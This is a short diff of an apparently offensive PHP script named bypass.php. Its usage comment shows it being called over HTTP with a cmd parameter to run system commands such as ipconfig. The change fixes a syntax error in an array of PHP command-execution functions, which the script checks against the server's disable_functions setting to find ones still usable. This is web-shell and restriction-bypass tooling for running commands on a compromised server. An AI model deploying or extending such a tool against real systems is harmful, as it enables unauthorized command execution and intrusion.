@@ -3,7 +3,7 @@
 //usage: http://lemon.love:8081/bypass.php?cmd=ipconfig
 
 msg("php enable_functions  enumeration script");
-$func_arr=array('dl','exec','system','passthru','popen','proc_open','pcntl_exec','shell_exec','mail','symlink','putenv')
+$func_arr=array('dl','exec','system','passthru','popen','proc_open','pcntl_exec','shell_exec','mail','symlink','putenv');
 $dis_func_arr = explode(",",get_cfg_var("disable_functions"));
 
 if($dis_func_arr[0]){
